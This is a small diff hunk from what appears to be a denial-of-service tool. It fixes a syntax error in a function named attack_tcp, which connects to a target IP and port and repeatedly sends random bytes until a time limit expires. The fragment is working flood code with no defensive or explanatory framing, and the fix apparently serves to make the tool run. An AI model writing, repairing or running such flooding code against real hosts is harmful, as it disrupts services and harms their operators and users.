@@ -304,7 +304,7 @@ def attack_tcp(ip, port, secs, size):
         try:
             s.connect((ip, port))
             while time.time() < secs:
-                s.send(random._urandom(size)))
+                s.send(random._urandom(size))
         except:
             pass
 
